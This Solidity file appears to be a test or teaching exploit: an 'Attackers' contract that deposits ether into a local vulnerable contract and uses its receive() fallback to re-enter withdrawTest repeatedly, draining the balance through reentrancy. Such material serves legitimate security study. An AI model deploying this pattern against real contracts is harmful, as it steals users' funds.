// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./vulnerable_contract.sol";
import "forge-std/console.sol";  // Make sure to use forge-std for logging

interface IVulnerableContract {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function withdrawTest(uint256 amount) external;
}

contract Attackers {
     IVulnerableContract public vulnerableContract;

    constructor(address _vulnerableContract) {
        vulnerableContract = IVulnerableContract(_vulnerableContract);
    }

    // Initiates the attack by depositing ether and triggering the withdrawal
    function attack() external payable {
        // Deposit ether into the vulnerable contract
        vulnerableContract.deposit{value: msg.value}();

        // Trigger the withdrawal (start reentrancy)
        vulnerableContract.withdrawTest(msg.value); // Use withdrawTest to bypass reentrancy guard for testing
    }

    // Fallback function to allow reentrancy attack
    receive() external payable {
        uint256 vulnerableContractBalance = address(vulnerableContract).balance;

        // Ensure there is enough ether in the contract to keep withdrawing
        if (vulnerableContractBalance >= msg.value) {
            // Re-enter the vulnerable contract and trigger another withdrawal
            vulnerableContract.withdrawTest(msg.value); // Again bypass the reentrancy guard during the attack
        }
    }
}
